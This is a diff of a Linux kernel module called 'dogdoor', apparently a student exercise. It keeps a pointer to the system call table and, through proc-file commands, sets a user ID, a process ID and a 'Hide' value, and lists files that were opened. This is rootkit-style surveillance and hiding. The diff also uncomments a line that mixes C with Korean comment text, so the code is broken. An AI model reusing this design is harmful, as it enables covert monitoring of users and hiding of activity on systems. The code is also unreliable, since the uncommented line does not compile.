@@ -12,9 +12,7 @@
 MODULE_LICENSE("GPL");
 
 char filepath[128] = { 0x0, } ;
-//char userID[32] = { 0x0, };
 unsigned int userID = 1;
-//char processID[32] = { 0x0, };
 unsigned int processID = 1;
 char Hide[32] = { 0x0, };
 void ** sctable ;
@@ -67,7 +65,6 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
         ssize_t toread = 0 ;
         int i = 0;
 
-//      sprintf(buf, "%s:%d\n", filepath, count) ;
         sprintf(buf, "%u\n", userID);
         for (i=0; i < count; i++) {
                 sprintf(buf, "%s\n", listOF[i]);
@@ -94,22 +91,17 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 
         if (buf[0] == 'u') {
                 sscanf(buf+sizeof(char), "%u", &userID);
-                //sprintf(userID);
-                //openedfile = {0x0,}; 초기화 시켜주기
-                //count =0;
+                openedfile = {0x0,}; 초기화 시켜주기
+                count =0;
         }
 
         if (buf[0] == 'p') {
                 sscanf(buf+sizeof(char), "%u", &processID);
-                //sprintf(processID);
         }
 
         if (buf[0] == 'h') {
                 sscanf(buf+sizeof(char), "%c", Hide);
-                //sprintf(Hide);
         }
-        //sscanf(buf,"%s", filepath) ;
-        //count = 0 ;
         *offset = strlen(buf) ;
 
         return *offset ;
